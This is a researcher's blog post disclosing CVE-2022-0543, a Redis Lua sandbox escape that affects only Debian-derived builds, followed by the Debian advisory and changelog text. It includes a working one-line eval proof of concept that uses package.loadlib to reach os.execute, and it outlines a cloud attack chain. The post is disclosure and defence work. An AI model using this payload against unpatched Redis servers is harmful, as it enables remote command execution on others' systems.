# An unexpected Redis sandbox escape affecting only Debian, Ubuntu, and other derivatives

This post describes how I broke the Redis sandbox, but only for
Debian and Debian-derived Linux distributions. Upstream Redis is
not affected. That makes it a Debian vulnerability, not a Redis
one. The culprit, if you will, is dynamic linking, but there
will be more on that later.

This received the CVE id of [CVE-2022-0543](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0543). Debian also
released
the [DSA-5081
security advisory](https://www.debian.org/security/2022/dsa-5081) on 18/Feb/2022, and Ubuntu
released [USN-5316-1](https://ubuntu.com/security/notices/USN-5316-1)
on 7/Mar/2022, so I'm releasing this post on 8/Mar/2022.

## Redis in 30 seconds

[Redis](https://redis.io/) is a very widely used
service for caching, but it's also used as a message
broker. Clients talk to a Redis server over a socket, send
commands, and the server changes its state (i.e. its in-memory
structures), in response to such commands. Redis embeds the Lua
programming language as its scripting engine, which is made
available through the **eval** command. The Lua engine
is [expected to be
sandboxed](http://antirez.com/news/119), i.e., clients can interact with the Redis APIs
from Lua, but should not be able to execute arbitrary code on
the machine where Redis is running.

## Background

Back in January, I was doing research on Redis, not because of
Redis per se, but because I have a hunch that cloud providers of
standalone Redis (and other DB) services might be doing
"interesting" things that might lead to cross-account
vulnerabilities. Some earlier examples of the kind of attack I'm
talking about include:

* Ezequiel
  Pereira's [attack
  on Google Cloud SQL](https://www.ezequiel.tech/2020/08/dropping-shell-in.html), back in 2020
* Wiz's [ChaosDB
  vulnerability on Azure's Cosmos DB](https://www.wiz.io/blog/chaosdb-explained-azures-cosmos-db-vulnerability-walkthrough/), in 2021
* Orca
  Security's [AutoWarp
  Azure Automation Environment vulnerability](https://orca.security/resources/blog/autowarp-microsoft-azure-automation-service-vulnerability/), in March of
  2022.

The general path to such an attack would be:

1. Find an RCE vulnerability on a cloud service
2. Escape the container, if any
3. Talk directly to the orchestrator and/or some kind of metadata
   service, which will assume you are trusted, because it assumes
   only trusted services can talk to it in the first place

Of those, the hardest part is the first, in my experience. Usually,
the container can be escaped trivially. The fact that the
orchestrator/metadata service accepts commands is of course a
vulnerability, but a fairly prevalent one. The word is out that it's
possible to talk to orchestrators/metadata services from less
privileged contexts, so maybe that will get fixed over time. But for
now, cool bounties can be made by researchers doing what I was
trying to do here.

## The PoC

On a x86-64 machine, one can do:

`eval 'local os_l =
package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so",
"luaopen_os"); local os = os_l(); os.execute("touch /tmp/redis_poc");
return 0'`

For other architectures, the path to loadlib must be adjusted.

## Why, though?

At first, I thought I had found a general vulnerability, but I
quickly noticed that trying the PoC on different distros or on
code I built myself didn't work. Upstream Redis statically links
Lua so, since the luaopen\_package and luaopen\_os functions are
not used by Redis, those functions aren't even present in the
binary. Redis upstream also includes and initializes the
lua-bitop and lua-cjson libraries, which are not part of
standard Lua. The initialization of upstream Redis looks like this:

```

void luaLoadLibraries(lua_State *lua) {
    luaLoadLib(lua, "", luaopen_base);
    luaLoadLib(lua, LUA_TABLIBNAME, luaopen_table);
    luaLoadLib(lua, LUA_STRLIBNAME, luaopen_string);
    luaLoadLib(lua, LUA_MATHLIBNAME, luaopen_math);
    luaLoadLib(lua, LUA_DBLIBNAME, luaopen_debug);
    luaLoadLib(lua, "cjson", luaopen_cjson);
    luaLoadLib(lua, "struct", luaopen_struct);
    luaLoadLib(lua, "cmsgpack", luaopen_cmsgpack);
    luaLoadLib(lua, "bit", luaopen_bit);

#if 0 /* Stuff that we don't load currently, for sandboxing concerns. */
    luaLoadLib(lua, LUA_LOADLIBNAME, luaopen_package);
    luaLoadLib(lua, LUA_OSLIBNAME, luaopen_os);
#endif

```

On Debian, Lua is loaded dynamically by Redis and, moreover,
lua-bitop and lua-cjson are their own packages, which are loaded
when the Lua interpreter itself is initialized. When the
interpreter initialization was performed, the **module**
and **require** Lua variables, which are present in the
global environment on upstream Lua, but not on Redis' Lua, and
would also enable this same attack, were cleared out, but
the **package** variable was not. This was done via the
debian/rules file, which generates a debian/lua\_libs\_debian.c
files, which is included right after the *#endif*
directive shown above. Here are the relevant excerpts:

```

# Try and use these Lua modules shipped in Debian...
LUA_LIBS_DEBIAN = cjson bitop

# ... which are not always called their "C" names
LUA_LIBS_DEBIAN_NAMES = cjson bit

# ...

debian/lua_libs_debian.c:
        echo "// Automatically generated; do not edit." >$@
        echo "luaLoadLib(lua, LUA_LOADLIBNAME, luaopen_package);" >>$@
        set -e; for X in $(LUA_LIBS_DEBIAN_NAMES); do \
                echo "if (luaL_dostring(lua, \"$$X = require('$$X');\"))" >>$@; \
                echo "    serverLog(LL_NOTICE, \"Error loading $$X library\");" >>$@; \
        done
        echo 'luaL_dostring(lua, "module = nil; require = nil;");' >>$@

```

Note that luaopen\_package ends up being called, contrary to
what happens in upstream. That has the side effect of binding
three variables in the global
environment: **module**, **require**,
and **package**. The first two are cleared out in the
vulnerable version, but the latter wasn't. So, the fix was,
you guessed it, to add **package=nil** to the end of the Lua
initialization.

## Who should care?

Only people who run Redis on Debian, Ubuntu, and possibly other
Debian-based distros. Just make sure your system is up to
date.

Interestingly, I was surprised that I had to report this to
Debian and Ubuntu separately. I expected that Ubuntu would either
automatically pick the fix up or that there would be a manual
process wherein someone at Canonical would take a look at all
Debian security announcements and check whether they apply to
Ubuntu as well. I'll leave that as a suggestion to Canonical.

Package        : redis
CVE ID         : CVE-2022-0543
Debian Bug     : 1005787

Reginaldo Silva discovered a (Debian-specific) Lua sandbox escape in
Redis, a persistent key-value database.

For the oldstable distribution (buster), this problem has been fixed
in version 5:5.0.14-1+deb10u2.

For the stable distribution (bullseye), this problem has been fixed in
version 5:6.0.16-1+deb11u2.

We recommend that you upgrade your redis packages.

For the detailed security status of redis please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/redis>

   * [CVE-2022-0543](https://security-tracker.debian.org/tracker/CVE-2022-0543): Prevent a Debian-specific Lua sandbox escape vulnerability.
 .
     This vulnerability existed because the Lua library in Debian is provided as
     a dynamic library. A "package" variable was automatically populated that
     in turn permitted access to arbitrary Lua functionality. As this extended
     to, for example, the "execute" function from the "os" module, an attacker
     with the ability to execute arbitrary Lua code could potentially execute
     arbitrary shell commands.
 .
     Thanks to Reginaldo Silva <<https://www.ubercomp.com>> for discovering and
     reporting this issue. (Closes: #[1005787](bugreport.cgi?bug=1005787))

   * [CVE-2022-0543](https://security-tracker.debian.org/tracker/CVE-2022-0543): Prevent a Debian-specific Lua sandbox escape vulnerability.
 .
     This vulnerability existed because the Lua library in Debian is provided as
     a dynamic library. A "package" variable was automatically populated that
     in turn permitted access to arbitrary Lua functionality. As this extended
     to, for example, the "execute" function from the "os" module, an attacker
     with the ability to execute arbitrary Lua code could potentially execute
     arbitrary shell commands.
